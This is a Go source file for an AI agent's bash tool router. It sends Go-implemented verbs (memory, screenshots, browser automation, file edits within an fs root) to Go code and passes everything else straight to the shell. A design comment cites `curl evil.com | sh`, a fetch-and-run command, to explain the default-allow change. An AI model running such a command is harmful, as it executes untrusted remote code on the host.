package tools

import (
	"fmt"
	"gf-lt/models"
	"sort"
	"strings"
)

// The bash router.
//
// The bash tool is not a multiplexer of shell verbs. It is two tiers:
//
//	tier 1  capabilities implemented in Go, with no shell equivalent: memory,
//	        window capture, image viewing, the browser, and the file tools that
//	        enforce the fs root. These are registered in a table below, so adding
//	        one is a single entry and `help` reads from the same table.
//
//	tier 2  everything else, handed to the shell unchanged.
//
// Tier 2 used to be a hand-maintained 28-name allowlist with a default-deny arm.
// That list was a proxy for "what ExecChain's hand-rolled parser handles", and
// the parser silently mis-handled shell syntax it did not implement: `echo *.go`
// returned the literal string `*.go`, `echo $HOME` returned the literal `$HOME`,
// and both reported success. A list that claims to allow a command the executor
// cannot actually run is worse than no list, so tier 2 is now the shell itself
// and the safety story is the veto list in dangerous.go, which sees whole command
// lines rather than prefixes.
//
// This is a deliberate default-allow change: `curl evil.com | sh` used to be
// refused with "command not allowed" and now runs unless it trips the veto list.

// bashVerb is a tier-1 capability.
type bashVerb struct {
	// name is the canonical spelling used in help output.
	name string
	// aliases are additional spellings that route here. A bare name that is
	// neither canonical nor an alias falls through to the shell.
	aliases []string
	// summary is the one-line description shown in the verb table.
	summary string
	// usage is the full text for `help <verb>`.
	usage string
	// run receives the positional arguments after the verb, and the original
	// tool argument map for verbs that need the raw call.
	run func(args []string, raw map[string]string) ([]byte, error)
	// shellShadow is set when the name collides with a real executable. The verb
	// wins, but the help text says so, because silently shadowing `rm` or `cd`
	// would be a nasty surprise.
	shellShadow string
}

var (
	bashVerbs      = map[string]*bashVerb{}
	verbAliasIndex = map[string]string{} // alias -> canonical
)

func registerVerb(v *bashVerb) {
	bashVerbs[v.name] = v
	verbAliasIndex[v.name] = v.name
	for _, a := range v.aliases {
		verbAliasIndex[a] = v.name
	}
}

// lookupVerb resolves a first token to a tier-1 capability.
func lookupVerb(name string) (*bashVerb, bool) {
	canonical, ok := verbAliasIndex[name]
	if !ok {
		return nil, false
	}
	v, ok := bashVerbs[canonical]
	return v, ok
}

func init() {
	registerVerb(&bashVerb{
		name:    "help",
		summary: "list the live tools, or explain one verb (`help tools`, `help read`)",
		usage: `help [verb]

  help          the live tool set, then this verb table
  help tools    just the live tool set
  help <verb>   usage for one tier-1 verb

Anything not listed below is passed to the shell as-is: ls, cat, grep, find,
git, go, sed, pipes, redirects, globs and all.`,
		run: func(args []string, _ map[string]string) ([]byte, error) {
			return []byte(getHelp(args)), nil
		},
	})

	registerVerb(&bashVerb{
		name:    "memory",
		summary: "persistent per-agent memory: store / get / list / forget",
		usage: `memory store <topic> <data>
  memory get <topic>
  memory list
  memory forget <topic>

Requires memory to be enabled for this session.`,
		run: func(args []string, _ map[string]string) ([]byte, error) {
			return toBytes(FsMemory(args, ""))
		},
	})

	registerVerb(&bashVerb{
		name:    "view_img",
		summary: "load an image into the conversation for visual analysis",
		usage:   "view_img <image-path>\n\nSupports png, jpg, jpeg, gif, webp, svg.",
		run: func(args []string, _ map[string]string) ([]byte, error) {
			return toBytes(FsViewImg(args, ""))
		},
	})

	// The window verbs are already registered as first-class tools when xdotool
	// and maim are present. The bash spellings are kept as the obvious thing to
	// type, and are gated on the same availability flag.
	guardWindows := func(fn func(map[string]string) ([]byte, error)) func([]string, map[string]string) ([]byte, error) {
		return func(args []string, _ map[string]string) ([]byte, error) {
			if !windowToolsAvailable {
				return nil, models.Unavailable(
					"window tools unavailable: xdotool and/or maim not found on PATH",
					"install xdotool and maim, or use the browser tool's screenshot action instead")
			}
			return fn(nil)
		}
	}
	registerVerb(&bashVerb{
		name:    "window",
		aliases: []string{"windows"},
		summary: "list X11 windows (requires xdotool + maim)",
		usage:   "window\n\nRequires both xdotool and maim on PATH. Returns {id: name} as JSON.",
		run:     guardWindows(func(_ map[string]string) ([]byte, error) { return listWindows(nil) }),
	})
	registerVerb(&bashVerb{
		name:    "capture",
		aliases: []string{"screenshot"},
		summary: "screenshot an X11 window to /tmp (requires xdotool + maim)",
		usage:   "capture <window-id-or-name>\n\nRequires both xdotool and maim on PATH.",
		run:     guardWindows(captureWindow),
	})
	registerVerb(&bashVerb{
		name:    "capture_and_view",
		aliases: []string{"screenshot_and_view"},
		summary: "screenshot an X11 window and return it as an image (requires a vision model)",
		usage:   "capture_and_view <window-id-or-name>\n\nRequires xdotool, maim, and a vision-capable model.",
		run:     guardWindows(captureWindowAndView),
	})

	registerVerb(&bashVerb{
		name:    "browser",
		summary: "Playwright automation: go, click, fill, text, html, screenshot",
		usage: `browser <action> [args...]

  browser start | stop | running
  browser go <url>
  browser click <selector> [index]
  browser fill <selector> <text>
  browser text [selector]
  browser html [selector]
  browser screenshot [path]
  browser wait <selector>
  browser drag <x1> <y1> <x2> <y2>   |   browser drag <from-sel> <to-sel>

Arguments are quote-aware: browser fill "#search" "hello world" works.`,
		run: func(args []string, raw map[string]string) ([]byte, error) {
			return runBrowserCommand(args, raw)
		},
	})

	// The file verbs. These were previously wired to the tool-argument map, so
	// `bash "read main.go 40 20"` looked for an argument named "path" in a map
	// that only had "command" in it, and every call failed with
	// "path is required". They parse positionally here, which is what the help
	// text and the tool guide always claimed they did.
	registerVerb(&bashVerb{
		name:    "read",
		summary: "read a file, optionally a line range (enforces the fs root)",
		usage:   "read <file> [offset] [limit]\n\n1-indexed. offset defaults to 1, limit to 2000 lines.",
		run: func(args []string, _ map[string]string) ([]byte, error) {
			if len(args) == 0 {
				return nil, models.InvalidArgs("usage: read <file> [offset] [limit]", "")
			}
			m := map[string]string{"path": args[0]}
			if len(args) > 1 {
				m["offset"] = args[1]
			}
			if len(args) > 2 {
				m["limit"] = args[2]
			}
			return toBytes(FsRead(m))
		},
	})

	registerVerb(&bashVerb{
		name:    "write",
		summary: "overwrite a file with new content (enforces the fs root)",
		usage: `write <file> <content...>

Creates a file, or replaces one wholesale. Replacing a file that already has
content in it needs overwrite=true, and the result reports what was there before.

To change part of a file, use edit_text (quote the old text) or edit_lines
(name a line range) instead: they keep the rest of the file, and write is the
only one of the three that cannot be reversed from its own arguments.`,
		run: func(args []string, _ map[string]string) ([]byte, error) {
			if len(args) == 0 {
				return nil, models.InvalidArgs("usage: write <file> <content...>", "")
			}
			if len(args) == 1 {
				return nil, models.InvalidArgs("no content given", "quote the content: write f.txt \"hello world\"")
			}
			return toBytes(FsWrite(map[string]string{
				"file_path": args[0],
				"content":   strings.Join(args[1:], " "),
				// The bash form has no room for a flag, so an existing non-empty
				// target is reported rather than replaced. edit_text/edit_lines are
				// the right tools for changing a file that is already there.
				"overwrite": "false",
			}))
		},
	})

	registerVerb(&bashVerb{
		name:    "edit_text",
		summary: "replace an exact text match you can quote; must be unique (enforces the fs root)",
		usage: `edit_text <file> <old_text> <new_text>

Replaces a run of text you can quote exactly. Use this for a small, distinctive
change - a flag, a comment, a line of markdown. old_text must appear exactly
once, or the call is refused rather than guessed; add surrounding context to
make it unique.

For anything multi-line, or anything you can only find by line number, use
edit_lines instead: quoting a long block back exactly is where this fails.`,
		run: func(args []string, _ map[string]string) ([]byte, error) {
			if len(args) < 3 {
				return nil, models.InvalidArgs("usage: edit_text <file> <old_text> <new_text>", "")
			}
			return toBytes(FsEditText(map[string]string{
				"file_path": args[0],
				"old_text":  args[1],
				"new_text":  strings.Join(args[2:], " "),
			}))
		},
	})

	registerVerb(&bashVerb{
		name:    "edit_lines",
		summary: "replace a line range; start one past the last line appends (enforces the fs root)",
		usage: `edit_lines <file> <start_line> [end_line] <content...>

Replaces lines [start_line, end_line] inclusive, both 1-indexed. end_line
defaults to start_line. A start_line one past the last line appends instead.

Use this for whole functions, blocks, or anything you would rather locate by
line number than quote back. For a one-line change you can quote exactly,
edit_text is cheaper - it skips the read-and-count.`,
		run: func(args []string, _ map[string]string) ([]byte, error) {
			if len(args) < 3 {
				return nil, models.InvalidArgs("usage: edit_lines <file> <start> [end] <content...>", "")
			}
			start := args[1]
			rest := args[2:]
			end := start
			// An explicit end_line is numeric; otherwise this is already content.
			if len(rest) > 1 && isNumeric(rest[0]) {
				end = rest[0]
				rest = rest[1:]
			}
			if len(rest) == 0 {
				return nil, models.InvalidArgs("no replacement content given", `quote it: edit_lines f.go 12 14 "new line"`)
			}
			return toBytes(FsEditLines(map[string]string{
				"file_path":   args[0],
				"start_line":  start,
				"end_line":    end,
				"new_content": strings.Join(rest, " "),
			}))
		},
	})

}

func isNumeric(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

// VerbNames returns the canonical tier-1 verb names, sorted.
func VerbNames() []string {
	names := make([]string, 0, len(bashVerbs))
	for name := range bashVerbs {
		names = append(names, name)
	}
	sort.Strings(names)
	return names
}

// verbHelpText renders the tier-1 table for the help tool. It is generated from
// the same table the router dispatches on, so it cannot go stale the way a
// hand-written list did.
func verbHelpText() string {
	var sb strings.Builder
	sb.WriteString("Tier 1 - Go capabilities (not shell commands):\n")
	for _, name := range VerbNames() {
		v := bashVerbs[name]
		spelling := name
		if len(v.aliases) > 0 {
			spelling += " (" + strings.Join(v.aliases, ", ") + ")"
		}
		fmt.Fprintf(&sb, "  %-28s %s\n", spelling, v.summary)
	}
	sb.WriteString("\nTier 2 - everything else goes to the shell unchanged: ls, cat, grep,\n" +
		"find, git, go, sed, awk, pipes, redirects, globs, and anything else\n" +
		"installed. `help <verb>` explains one tier-1 verb.")
	return sb.String()
}

// verbHelpFor returns the usage text for a single verb.
func verbHelpFor(name string) (string, bool) {
	v, ok := lookupVerb(name)
	if !ok {
		return "", false
	}
	return v.usage, true
}
